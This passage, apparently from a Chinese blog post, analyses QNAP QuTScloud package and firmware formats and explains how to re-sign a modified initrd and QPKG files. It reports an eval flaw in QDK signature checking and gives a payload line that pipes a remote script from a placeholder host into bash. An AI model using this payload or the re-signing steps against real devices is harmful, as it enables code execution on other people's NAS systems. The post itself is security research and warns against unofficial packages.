+</span></span><span style="display:flex;"><span>            <span style="color:#888">#$CMD_ECHO &#34;CS_QPKG_TYPE = ${CS_TYPE_QPKG}&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span></code></pre></div><h2 id="qpkg">QPKG</h2>
+<p>QPKG签名的位置及大小</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#963">CS_DS_POS</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$(</span><span style="color:#963">$CMD_ECHO</span> <span style="color:#963">$CS_DS_POS</span> | <span style="color:#963">$CMD_CUT</span> -f <span style="color:#60e;font-weight:bold">2</span> -d <span style="background-color:#fff0f0">&#39;=&#39;</span><span style="color:#080;font-weight:bold">)</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">CS_DS_SIZE</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$((</span><span style="color:#963">$qpkg_size</span> <span style="color:#333">-</span> <span style="color:#963">$CS_DS_POS</span> <span style="color:#333">-</span> <span style="color:#963">$CS_QDK_TAG_LEN</span> <span style="color:#333">-</span> <span style="color:#963">$CS_QPKG_TAIL_DATA_LEN</span> <span style="color:#333">-</span> <span style="color:#60e;font-weight:bold">1</span><span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span></code></pre></div><p>位置就是尾部找到的字符串QDK_offset=xxxx中的值，签名的长度就是总的长度减去其余的长度，我在下面标出来各个部分的长度</p>
+<pre tabindex="0"><code># 尾部的格式
+-----
+QDK_offset=xxxx #length: $CS_QDK_TAG_LEN
+-----
+空格             #length: 1
+-----
+签名
+-----
+qpkg info         #length: $CS_QPKG_TAIL_DATA_LEN 固定长度100byte
+</code></pre><p>获取安装文件以及签名的语句</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#签名</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">local</span> <span style="color:#963">skip_len</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$((</span><span style="color:#963">$CS_DS_POS</span> <span style="color:#333">+</span> <span style="color:#963">$CS_QDK_TAG_LEN</span><span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">$CMD_DD</span> <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="background-color:#eee">${</span><span style="color:#963">CS_QPKG_FILE</span><span style="background-color:#eee">}</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> <span style="color:#963">skip</span><span style="color:#333">=</span><span style="color:#963">$skip_len</span> <span style="color:#963">count</span><span style="color:#333">=</span><span style="color:#963">$CS_DS_SIZE</span> 2&gt;/dev/null &gt; <span style="background-color:#eee">${</span><span style="color:#963">CS_DS_FILE</span><span style="background-color:#eee">}</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#888">#安装文件</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">local</span> <span style="color:#963">ret</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$((</span><span style="color:#963">$CS_DS_POS</span> <span style="color:#333">-</span> <span style="color:#60e;font-weight:bold">1</span><span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">$CMD_DD</span> <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="background-color:#eee">${</span><span style="color:#963">CS_QPKG_FILE</span><span style="background-color:#eee">}</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$ret</span> <span style="color:#963">count</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> 2&gt;/dev/null &gt; <span style="background-color:#eee">${</span><span style="color:#963">CS_INSTALL_FILE</span><span style="background-color:#eee">}</span>
+</span></span></code></pre></div><p>注意到安装文件和末尾附加的tag之间还有一个字符<code>0x00</code></p>
+<h2 id="qdk">QDK</h2>
+<p>QDK的安装文件的长度在头部的脚本中，最后算出的offset就是安装文件的大小</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#963">script_len</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">4289</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#963">offset</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$(</span>/usr/bin/expr <span style="color:#963">$script_len</span> + 20480<span style="color:#080;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#963">offset</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$(</span>/usr/bin/expr <span style="color:#963">$offset</span> + 53924602<span style="color:#080;font-weight:bold">)</span>
+</span></span></code></pre></div><p>尾部则是一个TLV数组</p>
+<pre tabindex="0"><code>----
+TAG  (&#34;QDK&#34;)
+----
+TYPE (1 byte)
+----
+LENGTH OF VALUE (network order 4byte)
+----
+VALUE
+----
+...
+</code></pre><p>所以QDK包尾部的结构是</p>
+<pre tabindex="0"><code>---
+TLV (signture, type 0xFE, length: 1 + len(sign) byte)
+---
+TLV (EOF, type 0xFF, length: 1 byte)
+---
+qpkg info, length: 100byte
+</code></pre><h2 id="qpkg-info">QPKG INFO</h2>
+<p>这两种包的尾部都是是一个固定的字符串数组，等价定义（非NULL结尾，空格填充）</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#339;font-weight:bold">char</span> qpkginfo[<span style="color:#00d;font-weight:bold">100</span>];
+</span></span><span style="display:flex;"><span><span style="color:#339;font-weight:bold">char</span> <span style="color:#333">*</span>encrypt <span style="color:#333">=</span> <span style="color:#333">&amp;</span>qpkginfo[<span style="color:#00d;font-weight:bold">40</span>];  <span style="color:#888">// 整个包长度 * 3589 + 1000000000;
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#339;font-weight:bold">char</span> <span style="color:#333">*</span>pkg_name <span style="color:#333">=</span> <span style="color:#333">&amp;</span>qpkginfo[<span style="color:#00d;font-weight:bold">60</span>]; <span style="color:#888">// 包名，长度20byte，其他均为10byte
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#339;font-weight:bold">char</span> <span style="color:#333">*</span>version <span style="color:#333">=</span> <span style="color:#333">&amp;</span>qpkginfo[<span style="color:#00d;font-weight:bold">80</span>];  <span style="color:#888">// 包版本
+</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#339;font-weight:bold">char</span> <span style="color:#333">*</span>tag <span style="color:#333">=</span> <span style="color:#333">&amp;</span>qpkginfo[<span style="color:#00d;font-weight:bold">90</span>];      <span style="color:#888">// 固定字符串：QNAPQPKG
+</span></span></span></code></pre></div><h2 id="qdk代码执行漏洞">QDK代码执行漏洞</h2>
+<p>QKD包签名验证的脚本中有这样一个函数</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>get_content_size<span style="color:#333">(){</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#333">[</span> -n <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$1</span><span style="background-color:#fff0f0">&#34;</span> <span style="color:#333">]</span> <span style="color:#333">||</span> err_msg <span style="background-color:#fff0f0">&#34;internal error: get_content_size called with no argument&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">local</span> <span style="color:#963">qpkg</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$1</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#333">[</span> -f <span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">qpkg</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span> <span style="color:#333">]</span> <span style="color:#333">||</span> err_msg <span style="background-color:#fff0f0">&#34;&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">qpkg</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;: no such file&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">local</span> <span style="color:#963">offset_command</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$(</span>/bin/sed -n <span style="background-color:#fff0f0">&#34;1,/^exit 1/{
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">s/^script_len.*/&amp;;/p
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">s/^offset.*/&amp;;/p
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">/^exit 1/q
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">}&#34;</span> <span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">qpkg</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">)</span><span style="background-color:#fff0f0"> echo \$offset&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$(</span><span style="color:#007020">eval</span> <span style="color:#963">$offset_command</span><span style="color:#080;font-weight:bold">)</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span></code></pre></div><p>这里居然犯了这样一个错误，直接从包里面sed出语句然后eval？？？</p>
+<p>虽然进行包签名的验证，但是在这个函数执行的时候签名还没通过呀。</p>
+<p>如果有一个包，里面脚本这样写就可以随意执行了，然后再把包修改一下覆盖签名也可以通过了。</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#963">offset</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$(</span>curl https://xxx/xx.sh | bash; <span style="color:#007020">echo</span> <span style="background-color:#eee">${</span><span style="color:#963">oldoffset</span><span style="background-color:#eee">}</span><span style="color:#080;font-weight:bold">)</span>
+</span></span></code></pre></div><p>这样看来，这个签名其实看着有用，实际上也是只防君子不防小人</p>
+<p><strong>(所以请不要安装任何非官方地址下载的包)</strong></p>
+<p><strong>(所以请不要安装任何非官方地址下载的包)</strong></p>
+<p><strong>(所以请不要安装任何非官方地址下载的包)</strong></p>
+<p>关于eval以及类似eval的代码执行可以看看这个，感觉有点意思</p>
+<p><a href="https://www.vidarholen.net/contents/blog/?p=716">https://www.vidarholen.net/contents/blog/?p=716</a></p>
+<blockquote>
+<p>The shell evaluates values in an arithmetic context in several syntax constructs where the shell expects an integer. This includes: $((here)), ((here)), ${var:here:here}, ${var[here]}, var[here]=.. and on either side of any [[ numerical comparator like -eq, -gt, -le and friends.</p>
+</blockquote>
+<h1 id="4-如何修改固件及重签名">4. 如何修改固件及重签名</h1>
+<p>固件的imge分区表如下所示</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#fdisk -p /dev/sda</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Disk /dev/sda: 53.6 GB, <span style="color:#60e;font-weight:bold">53687091200</span> bytes
+</span></span><span style="display:flex;"><span><span style="color:#60e;font-weight:bold">8</span> heads, <span style="color:#60e;font-weight:bold">32</span> sectors/track, <span style="color:#60e;font-weight:bold">409600</span> cylinders
+</span></span><span style="display:flex;"><span><span style="color:#963">Units</span> <span style="color:#333">=</span> cylinders of <span style="color:#60e;font-weight:bold">256</span> * <span style="color:#963">512</span> <span style="color:#333">=</span> <span style="color:#60e;font-weight:bold">131072</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Device Boot      Start         End      Blocks   Id  System
+</span></span><span style="display:flex;"><span>/dev/sda1               <span style="color:#60e;font-weight:bold">1</span>          <span style="color:#60e;font-weight:bold">17</span>        <span style="color:#60e;font-weight:bold">2160</span>   <span style="color:#60e;font-weight:bold">83</span>  Linux
+</span></span><span style="display:flex;"><span>/dev/sda2   *          <span style="color:#60e;font-weight:bold">18</span>        <span style="color:#60e;font-weight:bold">1910</span>      <span style="color:#60e;font-weight:bold">242304</span>   <span style="color:#60e;font-weight:bold">83</span>  Linux
+</span></span><span style="display:flex;"><span>/dev/sda3            <span style="color:#60e;font-weight:bold">1911</span>        <span style="color:#60e;font-weight:bold">3803</span>      <span style="color:#60e;font-weight:bold">242304</span>   <span style="color:#60e;font-weight:bold">83</span>  Linux
+</span></span><span style="display:flex;"><span>/dev/sda4            <span style="color:#60e;font-weight:bold">3804</span>        <span style="color:#60e;font-weight:bold">3936</span>       <span style="color:#60e;font-weight:bold">17024</span>    <span style="color:#60e;font-weight:bold">5</span>  Extended
+</span></span><span style="display:flex;"><span>/dev/sda5            <span style="color:#60e;font-weight:bold">3804</span>        <span style="color:#60e;font-weight:bold">3868</span>        <span style="color:#60e;font-weight:bold">8304</span>   <span style="color:#60e;font-weight:bold">83</span>  Linux
+</span></span><span style="display:flex;"><span>/dev/sda6            <span style="color:#60e;font-weight:bold">3869</span>        <span style="color:#60e;font-weight:bold">3936</span>        <span style="color:#60e;font-weight:bold">8688</span>   <span style="color:#60e;font-weight:bold">83</span>  Linux
+</span></span></code></pre></div><p><code>/dev/sda2</code>及<code>/dev/sda3</code>是固件系统文件所在分区，<code>/dev/sda5</code>是配置所在分区，会挂载为<code>/mnt/boot_config</code>在系统重置后就会从这里读取数据，正常情况不会读，<code>/dev/sda6</code>似乎和<code>/dev/sda5</code>作用差不多，但是实际上应该不会用到，因为<code>/dev/sda5</code>使用的大小已经超过suid在<code>/dev/sda6</code>中的偏移量</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#dumpe2fs /dev/sda5 |grep &#34;^Block&#34;</span>
+</span></span><span style="display:flex;"><span>dumpe2fs 1.45.5 <span style="color:#333">(</span>07-Jan-2020<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>Block count:              2076		&lt;<span style="color:#333">=</span> 使用8M
+</span></span><span style="display:flex;"><span>Block size:               <span style="color:#60e;font-weight:bold">4096</span>       
+</span></span><span style="display:flex;"><span>Blocks per group:         <span style="color:#60e;font-weight:bold">32768</span>
+</span></span><span style="display:flex;"><span><span style="color:#888">#dumpe2fs /dev/sda6 |grep &#34;^Block&#34;</span>
+</span></span><span style="display:flex;"><span>dumpe2fs 1.45.5 <span style="color:#333">(</span>07-Jan-2020<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>Block count:              4096		&lt;<span style="color:#333">=</span> 使用4M，suid位于偏移+7864320处
+</span></span><span style="display:flex;"><span>Block size:               <span style="color:#60e;font-weight:bold">1024</span>
+</span></span><span style="display:flex;"><span>Blocks per group:         <span style="color:#60e;font-weight:bold">8192</span>
+</span></span></code></pre></div><p>而用户数据位于<code>cachedev1</code>，是一个基于<code>dm -&gt; md raid1 -&gt; drbd -&gt; lvm -&gt; dm</code>的文件系统</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># mount |grep cachedev</span>
+</span></span><span style="display:flex;"><span>/dev/mapper/cachedev1 on /share/CACHEDEV1_DATA <span style="color:#007020">type</span> ext4 <span style="color:#333">(</span>rw,usrjquota<span style="color:#333">=</span>aquota.user,jqfmt<span style="color:#333">=</span>vfsv1,user_xattr,data<span style="color:#333">=</span>ordered,data_err<span style="color:#333">=</span>abort,delalloc,nopriv,nodiscard,noacl<span style="color:#333">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># dmsetup ls --tree</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>dom_ext3 <span style="color:#333">(</span>253:13<span style="color:#333">)</span>		<span style="color:#333">=</span>&gt; /dev/dm-13
+</span></span><span style="display:flex;"><span> └─dom_ext <span style="color:#333">(</span>253:0<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>    └─ <span style="color:#333">(</span>8:0<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>cachedev1 <span style="color:#333">(</span>253:17<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span> └─vg288-lv1 <span style="color:#333">(</span>253:16<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>    └─ <span style="color:#333">(</span>147:1<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># lvdisplay</span>
+</span></span><span style="display:flex;"><span>  --- Logical volume ---
+</span></span><span style="display:flex;"><span>  LV Path                /dev/vg288/lv544
+</span></span><span style="display:flex;"><span>  LV Name                lv544
+</span></span><span style="display:flex;"><span>  VG Name                vg288
+</span></span><span style="display:flex;"><span>  LV UUID                lgBRpc-fUm3-kCyo-7f7p-ko92-Z7Sr-9XjRad
+</span></span><span style="display:flex;"><span>  LV Write Access        read/write
+</span></span><span style="display:flex;"><span>  LV Creation host, <span style="color:#007020">time</span> NASCFB4D4, 2022-03-20 20:29:15 +0800
+</span></span><span style="display:flex;"><span>  LV Status              NOT available
+</span></span><span style="display:flex;"><span>  LV Size                532.00 MiB
+</span></span><span style="display:flex;"><span>  Current LE             <span style="color:#60e;font-weight:bold">133</span>
+</span></span><span style="display:flex;"><span>  Segments               <span style="color:#60e;font-weight:bold">2</span>
+</span></span><span style="display:flex;"><span>  Allocation             inherit
+</span></span><span style="display:flex;"><span>  Read ahead sectors     <span style="color:#60e;font-weight:bold">8192</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  --- Logical volume ---
+</span></span><span style="display:flex;"><span>  LV Path                /dev/vg288/lv1
+</span></span><span style="display:flex;"><span>  LV Name                lv1
+</span></span><span style="display:flex;"><span>  VG Name                vg288
+</span></span><span style="display:flex;"><span>  LV UUID                IW4QCX-IG4K-zHr3-lzj4-AsI5-kZrK-yYdbRz
+</span></span><span style="display:flex;"><span>  LV Write Access        read/write
+</span></span><span style="display:flex;"><span>  LV Creation host, <span style="color:#007020">time</span> NASCFB4D4, 2022-03-20 20:29:17 +0800
+</span></span><span style="display:flex;"><span>  LV Status              available
+</span></span><span style="display:flex;"><span>  <span style="color:#888"># open                 1</span>
+</span></span><span style="display:flex;"><span>  LV Size                49.50 GiB
+</span></span><span style="display:flex;"><span>  Current LE             <span style="color:#60e;font-weight:bold">12672</span>
+</span></span><span style="display:flex;"><span>  Segments               <span style="color:#60e;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span>  Allocation             inherit
+</span></span><span style="display:flex;"><span>  Read ahead sectors     <span style="color:#60e;font-weight:bold">8192</span>
+</span></span><span style="display:flex;"><span>  Block device           253:16
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># pvdisplay</span>
+</span></span><span style="display:flex;"><span>  --- Physical volume ---
+</span></span><span style="display:flex;"><span>  PV Name               /dev/drbd1
+</span></span><span style="display:flex;"><span>  VG Name               vg288
+</span></span><span style="display:flex;"><span>  PV Size               50.02 GiB / not usable 2.21 MiB
+</span></span><span style="display:flex;"><span>  Allocatable           yes <span style="color:#333">(</span>but full<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>  PE Size               4.00 MiB
+</span></span><span style="display:flex;"><span>  Total PE              <span style="color:#60e;font-weight:bold">12805</span>
+</span></span><span style="display:flex;"><span>  Free PE               <span style="color:#60e;font-weight:bold">0</span>
+</span></span><span style="display:flex;"><span>  Allocated PE          <span style="color:#60e;font-weight:bold">12805</span>
+</span></span><span style="display:flex;"><span>  PV UUID               MMC869-xXZR-kKO9-1z9j-1OLc-eP1X-3WYSsL
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># drbdsetup show all</span>
+</span></span><span style="display:flex;"><span>resource r1 <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>    options <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>    _this_host <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        volume <span style="color:#60e;font-weight:bold">0</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>            device                      minor 1;
+</span></span><span style="display:flex;"><span>            disk                        <span style="background-color:#fff0f0">&#34;/dev/md1&#34;</span>;
+</span></span><span style="display:flex;"><span>            meta-disk                   internal;
+</span></span><span style="display:flex;"><span>            disk <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>                resync-rate             4194304k; <span style="color:#888"># bytes/second</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># cat /proc/mdstat</span>
+</span></span><span style="display:flex;"><span>Personalities : <span style="color:#333">[</span>linear<span style="color:#333">]</span> <span style="color:#333">[</span>raid0<span style="color:#333">]</span> <span style="color:#333">[</span>raid1<span style="color:#333">]</span> <span style="color:#333">[</span>raid10<span style="color:#333">]</span> <span style="color:#333">[</span>raid6<span style="color:#333">]</span> <span style="color:#333">[</span>raid5<span style="color:#333">]</span> <span style="color:#333">[</span>raid4<span style="color:#333">]</span> <span style="color:#333">[</span>multipath<span style="color:#333">]</span>
+</span></span><span style="display:flex;"><span>md1 : active raid1 dm-13<span style="color:#333">[</span>0<span style="color:#333">]</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#60e;font-weight:bold">52452096</span> blocks super 1.0 <span style="color:#333">[</span>1/1<span style="color:#333">]</span> <span style="color:#333">[</span>U<span style="color:#333">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>貌似写的有点多了，不过这里写这个的意思是，qutscloud可以在单一磁盘上保存系统固件和用户数据，也就是说，一块硬盘就可以使用qutscloud了，而不像qts，启动需要一块硬盘，而需要其他硬盘来存储用户数据，这也是qutscloud的优势之一，不过缺点就是硬件平台的QVS以及硬件转码就不被官方支持了，但是感觉如果能安装以及加驱动补丁的话，这两个事情应该也是可以做到的。</p>
+<p>好了，闲话不说了，下面说说怎么修改固件及重新签名，initrd的格式是cpio，所以修改和重新打包可以使用下面的命令</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># 在用户存储空间中解包</span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># 未激活则可以在/tmp中解包</span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># mount -t tmpfs tmpfs -o size=1G /tmp ; cd /tmp</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">cd</span> /share/CACHEDEV1_DATA/Public/
+</span></span><span style="display:flex;"><span>mkdir fw
+</span></span><span style="display:flex;"><span>mount /dev/mapper/dom3 fw
+</span></span><span style="display:flex;"><span>mkdir initrd <span style="color:#333">&amp;&amp;</span> <span style="color:#007020">cd</span> initrd
+</span></span><span style="display:flex;"><span>lzma -d &lt; ../fw/boot/initrd.boot | cpio -idm
+</span></span></code></pre></div><p>解包后在initrd就可以看到解包后的文件了，可以修改任意文件后重新打包</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># 因为内核模块已经包含，所以直接cpio打包就可以了，先切换到initrd目录下面</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">cd</span> initrd
+</span></span><span style="display:flex;"><span>find ./* | cpio -H newc -o | lzma -z &gt; ../initrd.boot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># 签名，使用上一步生成的签名用证书</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">cd</span> ..
+</span></span><span style="display:flex;"><span>openssl sha1 -binary initrd.boot | openssl cms -sign  -nodetach -binary -signer sign.crt -inkey sign.key &gt; initrd.boot.sign
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># 计算cksum，这里使用的crc</span>
+</span></span><span style="display:flex;"><span>cksum initrd.boot &gt; initrd.boot.cksum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># 然后cp回去就完了</span>
+</span></span><span style="display:flex;"><span>cp initrd.boot* fw/boot/
+</span></span></code></pre></div><p>当然通过签名的条件是上一步生成的根证书要记得放进去，并且做好链接，实际上qutscloud如果检测到固件签名校验失败并不会重启或者拒绝启动，只是会在通知中心弹出通知说你的系统被修改云云。</p>
+<h1 id="5-如何修改qpkg及重签名">5. 如何修改QPKG及重签名</h1>
+<h2 id="修改qpkg">修改QPKG</h2>
+<p>因为QPKG的头是固定长度，所以很容易就可以将其解压出来</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#579">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#579"></span><span style="color:#963">SIGN_CERT</span><span style="color:#333">=</span>sign.crt
+</span></span><span style="display:flex;"><span><span style="color:#963">SIGN_KEY</span><span style="color:#333">=</span>sign.key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#963">PREFIX</span><span style="color:#333">=</span>qpkg_workspace
+</span></span><span style="display:flex;"><span><span style="color:#963">EXTRACT_PATH</span><span style="color:#333">=</span>qpkg_content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>extract_qpkg<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">script_len</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>head -c <span style="color:#60e;font-weight:bold">5000</span> <span style="color:#963">$QPKG</span> | sed -n <span style="background-color:#fff0f0">&#34;s/.*bs=\([0-9]*\) skip=1.*/\1/gp&#34;</span> <span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> script size <span style="color:#963">$script_len</span>
+</span></span><span style="display:flex;"><span>        mkdir -p <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>
+</span></span><span style="display:flex;"><span>        dd <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="color:#963">$QPKG</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$script_len</span> <span style="color:#963">skip</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> | tar zx -C <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data
+</span></span><span style="display:flex;"><span>        dd <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="color:#963">$QPKG</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$script_len</span> <span style="color:#963">count</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> &gt; <span style="color:#963">$PREFIX</span>/head
+</span></span><span style="display:flex;"><span>        tail -c <span style="color:#60e;font-weight:bold">100</span> <span style="color:#963">$QPKG</span> &gt; <span style="color:#963">$PREFIX</span>/tail
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pack_qpkg<span style="color:#333">()</span> <span style="color:#333">{</span>
